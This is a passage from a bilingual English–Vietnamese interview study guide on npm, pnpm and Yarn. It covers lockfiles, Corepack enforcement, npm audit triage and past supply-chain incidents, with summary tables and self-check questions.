pnpm patch-commit /tmp/some-library-edit-abc123
# → Creates .patches/some-library@1.2.3.patch
# → Added to pnpm.patchedDependencies in package.json automatically

# pnpm.patchedDependencies (package.json):
{
  "pnpm": {
    "patchedDependencies": {
      "some-library@1.2.3": "patches/some-library@1.2.3.patch"
    }
  }
}
```

---

### ❌ Anti-Pattern 5: Mixing Package Managers in One Repo

```bash
# Wrong — multiple lockfiles in root:
package-lock.json   ← npm
yarn.lock           ← Yarn
pnpm-lock.yaml      ← pnpm

# How it happens:
# Developer A: uses npm (default)
# Developer B: uses pnpm (faster)
# Developer C: uses Yarn (company policy)
# → 3 lockfiles, 3 node_modules layouts, 3 different dep trees

# Problems:
# 1. Lockfile conflicts on every PR
# 2. Different dependency versions per developer
# 3. CI may use different PM than devs → "works locally"
# 4. Workspace features conflict (npm workspaces + pnpm workspaces = chaos)

# Solution: Enforce with packageManager field (Node.js Corepack)
# package.json:
{
  "packageManager": "pnpm@9.1.0"
}
# Corepack (built into Node.js 16.9+) blocks other PMs:
# $ npm install → Error: This project requires pnpm@9.1.0

# Enable Corepack:
corepack enable
corepack prepare pnpm@9.1.0 --activate

# Also add to CI:
- run: corepack enable
- run: pnpm install --frozen-lockfile
```

---

### ❌ Anti-Pattern 6: Ignoring `npm audit` Warnings as "Noise"

```bash
# Common mistake:
$ npm audit
found 47 vulnerabilities (12 moderate, 8 high, 1 critical)
# Developer: "It's all in devDependencies, not real"

# Why this is wrong:
# 1. devDependencies CAN reach production:
#    - Build tools that process untrusted input (webpack config injection)
#    - Source maps expose internal code in production
#    - Test runners with network access (supply chain)
# 2. Critical vulns hide in the noise:
#    CVE-2021-44906 (minimist): prototype pollution → RCE in some contexts
#    CVE-2022-37601 (loader-utils): prototype pollution via webpack
#    Both found in "dev-only" transitive deps

# Better approach:
npm audit --audit-level=high         # Only report high+
npm audit --json | jq '.metadata'    # Machine-readable summary

# CI policy:
- run: npm audit --audit-level=critical   # Fail only on critical
# Review high manually, fix critical automatically

# Triage framework:
# Critical: Fix immediately, block deployment
# High: Fix in sprint, track as ticket
# Moderate: Fix in next dependency update cycle
# Low: Accept with documented reasoning

# Real CVEs that "seemed like noise":
# event-stream (2018): transitive, dev context → Bitcoin theft
# colors.js (2022): direct dep, "just a utility" → brought down CI
# ua-parser-js (2021): "just parsing user agents" → cryptominer installed
```

---

## 🧠 Memory Hook

> **"FLAPS" = Flat layout → Phantom deps | Lockfile = Determinism | Audit = Security | pnpm = Pure store | Supply-chain = Freeze CI**

Bốn cột trụ của package manager mastery:

1. **Layout**: Flat (npm) → phantom deps. Symlink (pnpm) → strict isolation
2. **Lockfile**: `npm ci` in CI. Never `npm install` in CI. Lockfile in git always
3. **Audit + Provenance**: `npm audit` + socket.dev + Sigstore provenance
4. **pnpm + Turbo**: Global store hardlinks + remote build cache = scalable monorepo

---

## Q&A Summary Table / Bảng Tóm Tắt Q&A

| #   | Topic                                 | Difficulty | One-Line Answer                                                                       |
| --- | ------------------------------------- | ---------- | ------------------------------------------------------------------------------------- |
| Q1  | Same package.json, different installs | 🟢         | semver ranges + no lockfile = non-deterministic; lockfile pins exact versions         |
| Q2  | npm ci vs npm install                 | 🟢         | `install` = development (can update lockfile); `ci` = CI (frozen, clean, fast)        |
| Q3  | Flat vs symlink layout                | 🟡         | Flat → phantom deps + disk waste; pnpm symlinks → strict + 60-80% disk savings        |
| Q4  | Phantom dependencies                  | 🟡         | Imported but undeclared package hoisted by npm; pnpm blocks via symlink-only root     |
| Q5  | Peer dependencies                     | 🟡         | Host provides the dep (prevent 2 React instances); npm v7+ auto-installs              |
| Q6  | Lockfile merge conflicts              | 🟡         | pnpm merge driver; npm: take one side + `--package-lock-only`; prevention > cure      |
| Q7  | Yarn Berry PnP                        | 🔴         | No node_modules, zip cache, .pnp.cjs resolver; needs SDK patching for IDE/Jest/ESLint |
| Q8  | Supply-chain attacks                  | 🔴         | event-stream/colors.js/ua-parser-js; defend: lockfile freeze + socket.dev + Sigstore  |
| Q9  | Monorepo at scale                     | 🔴         | pnpm workspaces + Turborepo remote cache; CI key = OS+NodeVersion+LockfileHash        |
| Q10 | npm → pnpm migration                  | 🔴         | Fix phantom deps (main work); strict-peer-deps; public-hoist-pattern for tooling      |

---

## Cold Call / Câu Hỏi Gọi Nhanh

_Interviewer picks one of these without warning. Practice until answers are < 30 seconds._

> **"What is a phantom dependency and why does pnpm prevent it?"**

Phantom dep = package you import but didn't declare in `package.json` — exists because npm hoisted it from a transitive dep. pnpm only creates root-level symlinks for packages explicitly in your `package.json`, so unauthorized imports fail at install time, not silently at runtime.

> **"Why use npm ci instead of npm install in CI?"**

`npm ci` reads only the lockfile (never updates it), deletes `node_modules` for a clean install, and fails if lockfile is out of sync with `package.json`. `npm install` can silently upgrade packages and modify the lockfile, causing non-reproducible builds.

> **"event-stream attack — what happened, how to prevent?"**

Malicious actor gained npm publish rights, added `flatmap-stream` with AES-encrypted payload targeting Copay Bitcoin wallets. Prevention: use `npm ci` (lockfile freeze prevents auto-upgrade), socket.dev (detects new maintainers + suspicious code), npm provenance/Sigstore (cryptographic link between source and published package).

> **"How does pnpm save disk space compared to npm?"**

pnpm uses a content-addressable global store (`~/.pnpm-store`). Every unique file is stored once keyed by its hash. All projects hardlink to these shared files instead of copying. 100 projects using `react@18.3.1` → 1 copy of each file, 100 hardlinks. Typical savings: 60–80% less disk than npm.

> **"What is the ideal CI cache key for a pnpm monorepo?"**

`${{ runner.os }}-node${{ matrix.node-version }}-pnpm-${{ hashFiles('**/pnpm-lock.yaml') }}`. OS because native binaries are platform-specific. Node version because native module ABI changes between majors. Lockfile hash because it encodes the exact dependency graph — any dep change busts the cache correctly.

---

## Self-Check / Tự Kiểm Tra

Sau khi đọc xong tài liệu này, bạn có thể trả lời các câu sau không?

- [ ] Giải thích tại sao `^` và `~` trong `package.json` đòi hỏi phải có lockfile
- [ ] Phân biệt `npm install` vs `npm ci` — khi nào dùng cái nào
- [ ] Vẽ ASCII diagram cho 3 layout: flat, pnpm symlink, Yarn PnP
- [ ] Giải thích phantom dependency với code example cụ thể
- [ ] Biết 3 supply-chain attack cases: tên, năm, cơ chế, bài học
- [ ] Mô tả cache key design đúng cho GitHub Actions CI
- [ ] Giải thích lý do pnpm tiết kiệm disk hơn npm 60-80%
- [ ] Nêu 5 breaking changes khi migrate monorepo từ npm sang pnpm
- [ ] Biết Yarn Berry PnP tradeoffs — ai dùng, ai không nên dùng
- [ ] Giải thích npm provenance và Sigstore là gì

**Scoring:**

- 8–10 ✅: Senior-ready — can lead package manager decisions at Grab/Microsoft/Vercel scale
- 5–7 🟡: Mid-level — solid fundamentals, deepen supply-chain and PnP knowledge
- < 5 🟢: Junior — focus on lockfile semantics and npm ci first, then phantom deps
